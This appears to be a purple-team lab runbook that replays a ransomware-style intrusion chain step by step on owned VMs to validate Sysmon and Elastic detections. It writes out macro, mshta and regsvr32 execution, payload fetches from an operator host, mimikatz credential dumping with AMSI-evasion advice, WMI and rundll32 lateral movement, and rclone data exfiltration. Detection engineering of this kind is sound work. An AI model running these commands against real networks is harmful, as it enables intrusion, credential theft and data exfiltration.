# C0015 Attack Runbook — definitive step-by-step (S1–S15)

Canonical, machine-by-machine runbook for reproducing the C0015-inspired chain on the lab.
All steps are **benign surrogates on owned VMs**. Every stage lists: the **machine(s) and
account**, the **files involved** (C2-host path and guest path), the **exact commands**
(host invocation + guest/beacon command), the **expected telemetry** per channel, and the
**evidence to collect**. Correlate with `docs/attack-chain-plan.md` (fidelity) and
`docs/correlation-architecture.md` (join keys).

## Machines / accounts / files index

| Role | Machine (IP) | Account | Paths |
|---|---|---|---|
| Beachhead victim | WS01 (192.168.50.20) | `C0015\duc.user` (entry), `C0015\it.admin` (operator) | `C:\Users\duc.user\Desktop\c0015_entry.docm`; `%PUBLIC%\C0015\` (config/hta/beacon/markers); `C:\Tools\mimikatz.exe`; `C:\Users\Public\Videos\AnyDesk.exe`; `C:\ProcessHacker.exe`; `C:\ProgramData\C0015\` (rclone.exe, rclone.conf) |
| Lateral target | FS01 (192.168.50.30) | `C0015\it.admin` | `C:\C0015\` (143.dll, beacon, config, collect\) ; `C:\C0015-Impact-Corpus` / `-Backup`; shares `C:\Shares\Finance`, `C:\Shares\IT` |
| Operator host (this repo) | 192.168.50.1 | local | `scripts/`, `payloads/`, `stage/`, `evidence/`, `reports/` |
| C2 | operator host | — | C2-SIM `:8080`, HTTP staging `:8000` (`build/out/tools/`), rclone WebDAV sink `:9001` (`stage/sink/RUN-<id>/`) |
| Telemetry | Elastic 9.5.3 (ELASTIC01, Tailscale) | `elastic` (env-only creds) | aliases `logs-windows.sysmon_operational-c0015*`, `logs-system.security-c0015*` |

Conventions: `RUN=<RUN-YYYYMMDD-NN>` for every command; artifacts land under
`evidence/runs/<RUN>/`; each beacon command goes through the session token
`TOKEN=<S1-…>` from `c2sim.log` (`POST :8080/cmd?session=$TOKEN -Body '<cmd>'`).

---

## P0 — Preflight (C2 host + both VMs)

**C2 host — build the entry document (files: `payloads/packaging/gen_macro_embedded.ps1`,
`payloads/packaging/make_config.ps1`, `payloads/packaging/install_macro_docm.ps1`):**

```powershell
# per-run configs + servers (watchdog-aware) + run id
pwsh payloads/packaging/run_campaign_orchestrator.ps1 -RunId $RUN -Action Pre
(Get-Content stage/ws01/config-phase7.ini) -replace 'RUN-YYYYMMDD-NN', $RUN | Set-Content stage/ws01/config-phase7.ini -Encoding ASCII
Copy-Item stage/ws01/config-phase7.ini build/out/tools/config-phase7.ini -Force
# beacons + tools served by :8000 must be staged: 143.dll, beacon, conf, mimikatz, rclone, conf, AnyDesk, ProcessHacker
```
(P0 hangs on the tooling **not** being pre-installed on victims — everything arrives over
`:8000` during the run (T1105) or via the macro self-write.)

**WS01 (admin VM session; `C0015\it.admin`):**
1. Clear Word state for **both** profiles (automation reliability):
   ```cmd
   taskkill /IM WINWORD.EXE /F
   reg delete "HKCU\Software\Microsoft\Office\16.0\Word\Resiliency" /f        (it.admin hive)
   ```
   and for `duc.user` via an interactive scheduled task (see `payloads/packaging/victim_prep*.cmd`).
2. Install the entry document:
   ```cmd
   copy /Y <repo>\stage\ws01\macro_embedded.vba  C:\Windows\Temp\macro_embedded.vba
   copy /Y <repo>\payloads\packaging\install_macro_docm.ps1 C:\Windows\Temp\install_macro_docm.ps1
   powershell -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\install_macro_docm.ps1 `
     -MacroSource C:\Windows\Temp\macro_embedded.vba -OutPath C:\Users\duc.user\Desktop\c0015_entry.docm
   ```
   Verify the macro project landed: unzip the docm on the C2 host and check
   `word/vbaProject.bin` exists (a macro-less docm saves with no project — always verify).
3. Reset the victim disk state (pub clean, wf log clean, no `~$` lock).
4. **FS01**: RDP enabled (`fDenyTSConnections=0`) and audits:
   ```cmd
   auditpol /set /subcategory:"Logon"               /success:enable /failure:enable
   auditpol /set /subcategory:"Other Logon/Logoff Events" /success:enable /failure:enable
   auditpol /set /subcategory:"Detailed File Share" /success:enable /failure:enable
   ```
   (R16 needs Detailed File Share; R19 needs Logon; 4778/4779 need Other Logon/Logoff.)
5. C2 host: start the sink for this run
   ```powershell
   New-Item -ItemType Directory -Force stage\sink\$RUN
   Start-Process <rclone.exe> 'serve webdav --addr 0.0.0.0:9001 stage\sink\$RUN'
   ```
   Verify `:9001` listening.

---

## S1 — Entry: macro self-write → mshta → HTA → regsvr32

- **Machine**: WS01 — **file**: `C:\Users\duc.user\Desktop\c0015_entry.docm` — **actor**: manual victim open.
- **Step**: the user double-clicks the document (auto-macros enabled). The `AutoOpen`
  macro (standard module `c0015Payload`) writes
  `%PUBLIC%\C0015\config.ini`, `bootstrap.hta`, `c0015_beacon.ps1` (native VBA I/O,
  step-logged to `C:\Windows\Temp\c0015wf.log`), then launches `mshta` on the HTA; the HTA
  downloads `c0015-comparefor.jpg` (the DLL surrogate) from `:8000` and runs
  `regsvr32 /s c0015-comparefor.jpg`; the DLL registers and spawns the phase3 beacon.
- **Expected telemetry**:
  - Sysmon E1: `WINWORD.EXE` (par=explorer) → `mshta.exe` (par=WINWORD, same entity) →
    `regsvr32.exe` (par=mshta, same entity) → `powershell.exe` (par=regsvr32);
  - Sysmon E11: the three macro-written files (proc=WINWORD);
  - Sysmon E3: `:8000` (HTA download) then `:8080` (beacon poll);
  - `C:\Windows\Temp\c0015wf.log` step log; C2-SIM `register` line.
- **Evidence to collect**: es_ids + ts for the E1 chain (acceptance verifier asserts the
  entity joins), `c0015wf.log` tail, register token.

---

## S2–S3 — Beacon session-1 and callback loop

- **Machine**: WS01; beacon = `powershell -File %PUBLIC%\C0015\c0015_beacon.ps1 -Config %PUBLIC%\C0015\config.ini`
  (spawned by regsvr32→DLL).
- **Commands (operator)**:
  ```powershell
  $TOKEN = (Select-String c2sim.log -Pattern 'register stage=phase3' | Select-Object -Last 1) ...
  Invoke-RestMethod -Method Post -Uri "http://192.168.50.1:8080/runbook?session=$TOKEN&name=c0015-phase2"
  Invoke-RestMethod -Method Post -Uri "http://192.168.50.1:8080/cmd?session=$TOKEN" -Body '<command>'
  ```
- **Expected telemetry**: E3 polls `:8080` (first at ~register+2s), E1 cmd children for
  tasks; `c0015wf.log`-independent; C2-SIM `/sessions` shows the token.
- **Files**: `%PUBLIC%\C0015\token.txt` (runtime), markers `dll-executed.txt` etc.

---

## S4–S5 — Discovery and share enumeration (runbook)

- **Machine**: WS01, via the beacon (operator remote only).
- **Commands** (contents of `scripts/runbooks/c0015-phase2.json`, executed by the beacon):
  `whoami /all`, `net group "domain admins" /dom`, `net localgroup "administrator"`,
  `nltest /domain_trusts /all_trusts`, `net view /all /domain`, `net view /all`,
  `tasklist /s <host>`, `ping -n 1 <host>`, `systeminfo`, `Get-SmbShare`.
- **Expected telemetry**: E1 `cmd.exe` children of the beacon (≥5), `net1.exe`
  (`net view`) — drives R10/R11/R12/R13.
- **Evidence**: first discovery cmd es_id (window-gated) + runbook results from `/results`.

---

## S6 — Target manifest (orchestration) — **NOT RUN in the reference runs**

- Skipped by design; recorded as `NOT RUN` in the ledger with a reason. (Do not claim PASS.)

---

## S7 — Privilege elevation (local; operator remote)

- **Machine**: WS01; **file**: `C:\Windows\Temp\elevate.cmd` (wmic local create as it.admin).
- **Command** (guest, via vmrun as it.admin — the **only** non-beacon intrusion step):
  ```cmd
  wmic process call create "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Users\Public\C0015\c0015_beacon.ps1 -Config C:\Users\Public\C0015\config.ini"
  ```
  → new beacon (it.admin token) registers; then kill the `duc.user` beacon PIDs.
- **Expected telemetry**: E1 child of `WmiPrvSE.exe` on WS01; Security 4624 (workstation
  logon) + 4672 for it.admin; the pivot-auth logon on FS01 is a **Type 3 network logon**
  (`S7` evidence: 4624 T3, `SubjectLogonId`→`TargetLogonId` pair, same-host only).

---

## S7b — LSASS-access surrogate (credential-access **surface**, no extraction)

- **Machine**: WS01; **file**: `C:\Tools\mimikatz.exe` (fetched from `:8000/tools`).
- **Commands** (beacon, elevated token — split strings on the C2 host to avoid host-AMSI
  signatures; the guest command is the plain form):
  ```powershell
  # fetch
  Invoke-WebRequest http://192.168.50.1:8000/tools/mimikatz.exe -OutFile C:\Tools\mimikatz.exe -UseBasicParsing
  # run
  cmd /c C:\Tools\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
  ```
- **Expected telemetry**: Sysmon E1 (`mimikatz.exe`), **E10 → lsass grant 0x1010**
  (drives R15), E11 `lsass.dmp` decoy, E3 `:8000`; output contains benign NTLM-shaped
  placeholders only.
- **Evidence**: E10 es_id (target=lsass), the result block from `/results`.

---

## S8a — Tool handoff to FS01 (SMB C$, T1570)

- **Machine**: WS01 (beacon, elevated) → FS01 share `C$\C0015`.
- **Commands** (beacon):
  ```powershell
  New-Item -ItemType Directory -Force C:\ProgramData\C0015 | Out-Null
  Invoke-WebRequest http://192.168.50.1:8000/tools/c0015_143_surrogate.dll -OutFile C:\ProgramData\C0015\143.dll -UseBasicParsing
  Invoke-WebRequest http://192.168.50.1:8000/tools/c0015_beacon.ps1       -OutFile C:\ProgramData\C0015\c0015_beacon.ps1 -UseBasicParsing
  Invoke-WebRequest http://192.168.50.1:8000/tools/config-phase7.ini      -OutFile C:\ProgramData\C0015\config-phase7.ini -UseBasicParsing
  cmd /c copy /Y C:\ProgramData\C0015\143.dll            \\FS01\C$\C0015\c0015_143_surrogate.dll
  cmd /c copy /Y C:\ProgramData\C0015\c0015_beacon.ps1   \\FS01\C$\C0015\c0015_beacon.ps1
  cmd /c copy /Y C:\ProgramData\C0015\config-phase7.ini  \\FS01\C$\C0015\config-phase7.ini
  ```
- **Expected telemetry**: E3 `:8000` fetches; **S5145** on FS01 (`ShareName=*C$`);
  E11 staged files on FS01 (SMB target E11 lacks UNC/user — 5145 is authoritative).
- **Evidence**: 5145 es_id + C$ count; E11 staged-file es_id.

---

## S8b — WMI pivot: rundll32 space form (T1047 + T1218.011)

- **Machine**: WS01 elevated beacon → FS01.
- **Command** (beacon; the **space form** is required — WMI splits on commas):
  ```
  wmic /node:FS01 process call create "C:\Windows\System32\rundll32.exe C:\C0015\c0015_143_surrogate.dll LabEntry"
  ```
- **Expected telemetry**: FS01 **E1 `rundll32.exe` (parent=WmiPrvSE.exe)** with the
  `LabEntry` argument; **E7** ImageLoad of `c0015_143_surrogate.dll` (Signed=false) within
  seconds; E11 marker; the DLL spawns the phase7-session2 beacon (E1 powershell
  parent=rundll32).
- **Evidence**: E1+E7 es_ids (E7 hash field is often unpopulated — record path+signed,
  note the limitation).

---

## S9 — Second session + server-side receipt

- **Machine**: FS01 (beacon) + C2 host (receipt).
- **Result**: `phase7-session2` register; C2-SIM writes `evidence/runs/<RUN>/ART-07-01-<token8>.json`
  (receipt). E3 `:8080` from the **beacon entity** owns the callback.
- **Evidence**: register line, receipt file, E3 es_id; acceptance requires the E3 to be
  owned by the second-session beacon entity.

---

## S10 — Collection (T1005/T1039/T1074.001)

- **Machine**: WS01 elevated beacon → FS01 shares, staging into `\\FS01\C$\C0015\collect\`.
- **Commands** (beacon):
  ```
  cmd /c md \\FS01\C$\C0015\collect\Finance \\FS01\C$\C0015\collect\IT 2>nul
  cmd /c copy /Y \\FS01\C$\Shares\Finance\*.* \\FS01\C$\C0015\collect\Finance\
  cmd /c copy /Y \\FS01\C$\Shares\IT\*.*      \\FS01\C$\C0015\collect\IT\
  # manifest (11 lines) + zip on FS01 via powerShell:
  powershell -NoProfile -Command "...Get-ChildItem \\FS01\C$\C0015\collect -Recurse -File | hash..." 
  powershell -NoProfile -Command "Compress-Archive -Path \\FS01\C$\C0015\collect\* -DestinationPath \\FS01\C$\C0015\collect6.zip -Force"
  ```
- **Pull + manifest (C2 host)**:
  ```powershell
  & $vmrun copyFileFromGuestToHost $FS01 C:\C0015\collect6.zip stage\p3\collect6.zip
  Expand-Archive stage\p3\collect6.zip stage\p3\collect6 -Force
  python scripts/lab_tools.py manifest-new stage\p3\collect6 $RUN -o evidence/runs/$RUN/ART-08-01-RUN06.json   (rename as needed)
  ```
- **Expected telemetry**: FS01 E11 (`*collect*`), S5145 (C$/Finance reads).
- **Evidence**: manifest (11 files, per-file sha256) — the anchor for the transfer receipts.

---

## S11a/S11b — Transfer to internal sink (real rclone, two rounds)

- **Machine**: WS01 elevated beacon; sink on C2 host `:9001` (`stage/sink/$RUN/round{N}/DATA`).
- **Files**: `C:\ProgramData\C0015\rclone.exe` + `rclone.conf` (`[sink] type=webdav
  url=http://192.168.50.1:9001 vendor=other`), fetched from `:8000/tools`.
- **Command** (beacon; identical flags to the campaign report):
  ```
  cmd /c C:\ProgramData\C0015\rclone.exe copy --max-age 2y "\\FS01\C$\C0015\collect" `
    sink:round1/DATA --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 `
    --bwlimit 10M --config C:\ProgramData\C0015\rclone.conf
  ```
  Round 2 = `sink:round2/DATA` after the RDP step (day1/day4 mirror).
- **Receipts (C2 host)** — observed per-file data, canonical manifest hash:
  `python stage/analysis/gen_receipts06.py`-style generator writes
  `evidence/runs/$RUN/ART-09-01-round{1,2}-RUN<NN>.json` with `sink_files`
  (name/size/sha256 from `stage/sink/$RUN/round{N}/DATA`) and
  `manifest_sha256` = canonical (LF-normalized) hash of the manifest.
- **Expected telemetry**: E1 `rclone.exe` (parent=cmd), E3 `:9001`; **no rclone-specific
  rule** — evidence = events + receipts.
- **Evidence**: both rclone E1 es_ids, both receipts (11/11 per-file equality accepted by
  the verifier).

---

## S12 — RDP interactive (T1021.001)

- **Machine**: C2 host (`cmdkey` + `mstsc`) → FS01.
- **Commands** (C2 host):
  ```powershell
  cmdkey /generic:TERMSRV/192.168.50.30 /user:C0015\it.admin /pass:<cred>
  Start-Process mstsc -ArgumentList '/v:192.168.50.30'
  # FS01:
  query session   # expect rdp-tcp#N; an interactive logon produces a Type-10 4624
  ```
- **Interpretation**: 4624 T3 = network; **T10 = RemoteInteractive** (the only proof of a
  completed interactive logon); T4 = batch (not RDP-specific). Record the event (account,
  TargetLogonId) and the R19 alert ids; session lifetime is usually not captured (keep
  the stage PARTIAL unless fully characterized).
- **Files**: none beyond the standard Security log.

---

## S13 — Remote-access / process tool deployment (T1219.002 / process tool)

- **Machine**: WS01 elevated beacon.
- **Files**: `C:\Users\Public\Videos\AnyDesk.exe` (download `:8000/tools/AnyDesk.exe`),
  `C:\ProcessHacker.exe`.
- **Commands** (beacon):
  ```
  powershell -NoProfile -Command "Invoke-WebRequest http://192.168.50.1:8000/tools/AnyDesk.exe -OutFile C:\Users\Public\Videos\AnyDesk.exe -UseBasicParsing"
  powershell -NoProfile -Command "Invoke-WebRequest http://192.168.50.1:8000/tools/ProcessHacker.exe -OutFile C:\ProcessHacker.exe -UseBasicParsing"
  cmd /c start "" C:\Users\Public\Videos\AnyDesk.exe --get-id      # brief; vendor relay observed, never used as C2
  cmd /c start "" C:\ProcessHacker.exe                              # run; no dump
  ```
- **Expected telemetry**: E11 (Videos\ and C:\ root), E1 runs (AnyDesk after its drop —
  the verifier checks drop→run ordering), R20.
- **Evidence**: E11/E1 es_ids; note this is **host-level correlation** (R20 does not prove
  the executed binary is the dropped file).

---

## S14 — Bounded impact + bidirectional verify + rollback (T1486 surrogate)

- **Machine**: FS01 (`C0015\it.admin`, via vmrun — lab tooling, not intrusion tooling).
- **Files**: `C:\C0015\impact\c0015_impact.ps1`, `impact-manifest.json`
  (`corpus_root=C:\C0015-Impact-Corpus`, `backup_dir=C:\C0015-Impact-Backup`,
  caps 50 files / 512 KiB / 120 s, note `README_C0015_LAB.txt`, ext `.c0015`).
- **Commands**:
  ```cmd
  cd /d C:\C0015\impact
  powershell -NoProfile -ExecutionPolicy Bypass -File c0015_impact.ps1 -Manifest impact-manifest.json -Action Prepare
  powershell ... -Action Run
  powershell ... -Action Verify     # bidirectional: corpus->backup AND backup->corpus
  powershell ... -Action Rollback
  powershell ... -Action Verify     # expect hash-equal
  ```
- **Expected telemetry**: FS01 E11 corpus/renames/note (drives the E11 sweep); no
  dedicated detection rule (R21 retired).
- **Evidence**: console output → `evidence/runs/$RUN/ART-14-01-RUN<NN>.txt` + JSON summary
  (actions + the harness "file in use" note explanation).

---

## S15 — Verification + documentation

- **C2 host** (env creds only; `ES_USER`/`ES_PASS`):
  ```powershell
  $env:ES_USER='elastic'; $env:ES_PASS='<rotated-secret>'
  python scripts/verify/verify_final_phases.py $RUN      # acceptance: REQUIRED events + joins + hashes; FAIL/exit 1 otherwise
  python scripts/verify/fetch_evidence_ids.py            # window-gated es_id harvest for the ledger (optional)
  python -m unittest discover -s scripts/tests           # 20 offline component tests
  ```
- Then: write the ledger `evidence/runs/$RUN/RUN-<id>.json` (schema-conform: per-stage
  rows incl. S6 NOT RUN, input/output artifacts, canonical artifact_index hashes), the
  scorecard `ART-15-01-…`, and `reports/reference-run-<id>.md` (timeline with real UTC
  event/alerts, alert volume split, limitations). No estimated timestamps in ledger
  `ts` fields — put approximations in the detail text.

---

## Post-run

- Cleanup (beacons, Word, mshta, AnyDesk/ProcessHacker, rclone, servers):
  `pwsh payloads/packaging/launch_servers.ps1 -Stop` + taskkills per VM.
- Alert hygiene: close stale alerts before any re-run
  (`_update_by_query` on `.internal.alerts-security.alerts-default-*`, `workflow_status=closed`).
- Commit with a short message; keep the tree green (tests OK).